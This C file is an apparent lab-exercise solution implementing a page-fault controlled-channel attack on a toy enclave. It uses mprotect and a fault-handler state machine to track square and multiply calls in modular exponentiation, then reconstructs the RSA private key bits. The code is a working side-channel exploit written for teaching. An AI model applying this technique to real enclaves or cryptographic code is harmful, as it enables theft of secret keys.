/* utility headers */
#include "debug.h"
#include "pf.h"
#include "cacheutils.h"
#include <sys/mman.h>
#include "victim.h"

#define RSA_TEST_VAL    1234

int fault_fired = 0;
void *sq_pt = NULL, *mul_pt = NULL, *modpow_pt = NULL;

/* =========================== START SOLUTION =========================== */
enum pf_state {
    MODPOW  = 0,
    SQ      = 1,
    MUL     = 2,
};

#define INIT_MASK   0x10000
uint32_t mask = INIT_MASK;
uint16_t key = 0;
int iteration = 0;
/* =========================== END SOLUTION =========================== */

void fault_handler(void *base_adrs)
{
    /* =========================== START SOLUTION =========================== */
    enum pf_state state;

    if (base_adrs == sq_pt)
    {
        /* Detected start next iteration */
        if (!(iteration % 16))
        {
            mask = INIT_MASK;
            key  = 0;
            info_event("MODPOW INVOCATION");
        }
        iteration++;
        mask = mask >> 1;

        state = SQ;
        ASSERT( !mprotect(modpow_pt, 4096, PROT_NONE) );
    }
    else if (base_adrs == mul_pt)
    {
        state = MUL;
        ASSERT( !mprotect(modpow_pt, 4096, PROT_NONE) );

        /* Detected 1 bit */
        key |= mask;
    }
    else if (base_adrs == modpow_pt)
    {
        state = MODPOW;
        ASSERT( !mprotect(sq_pt, 4096, PROT_NONE) );
        ASSERT( !mprotect(mul_pt, 4096, PROT_NONE) );
    }
    else
    {
        info("#PF state machine in unknown state! :/");
        abort();
    }

    /* Execute with minimal access rights */
    ASSERT( !mprotect(base_adrs, 4096, PROT_READ | PROT_EXEC) );
    /* =========================== END SOLUTION =========================== */

    fault_fired++;
}

int main( int argc, char **argv )
{
    int rv = 1, secret = 0;
    int cipher, plain;

    /* ---------------------------------------------------------------------- */
    info("registering fault handler..");
    register_fault_handler(fault_handler);

    /* ---------------------------------------------------------------------- */
    info_event("Calling enclave..");
    sq_pt = square;
    mul_pt = multiply;
    modpow_pt = GET_PFN(modpow);
    info("square at %p; muliply at %p; modpow at %p", sq_pt, mul_pt, modpow_pt);

    cipher = ecall_rsa_encode(RSA_TEST_VAL);
    plain = ecall_rsa_decode(cipher);
    info("secure enclave encrypted '%d' to '%d'; decrypted '%d'", RSA_TEST_VAL, cipher, plain);

    /* =========================== START SOLUTION =========================== */
    ASSERT( !mprotect(sq_pt, 4096, PROT_NONE) );

    plain = ecall_rsa_decode(cipher);
    info("secure enclave encrypted '%d' to '%d'; decrypted '%d'", RSA_TEST_VAL, cipher, plain);
    info("--> RECONSTRUCTED KEY '%d' (0x%x)", key, key);
    /* =========================== END SOLUTION =========================== */

    info("all is well; exiting..");
	return 0;
}
